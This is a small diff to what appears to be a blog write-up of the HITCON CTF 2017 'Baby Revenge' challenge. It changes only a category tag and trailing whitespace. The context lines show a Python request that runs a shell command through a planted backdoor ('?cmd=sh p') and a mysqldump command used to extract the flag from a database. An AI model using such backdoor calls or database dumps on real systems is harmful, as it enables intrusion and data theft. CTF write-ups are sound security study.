@@ -3,7 +3,6 @@ title: Hitcon CTF 2017 - Baby Revenge
 date: '2017-11-06'
 lastmod: '2019-04-07T13:46:27+02:00'
 categories:
-- ctf_hitcon2017
 - writeup
 - hitcon2017
 tags:
@@ -134,7 +133,7 @@ print "Executing backdoor..."
 requests.get(url + "?cmd=sh p")
 ```
 
-In the home directory of the system we found that the flag is in the MySQL db 
+In the home directory of the system we found that the flag is in the MySQL db
 
 Having a polling backdoor we needed to use one command to exfiltrate the flag from the DB, so we used something like this:
 `mysqldump -u user -p'password' flagdb`
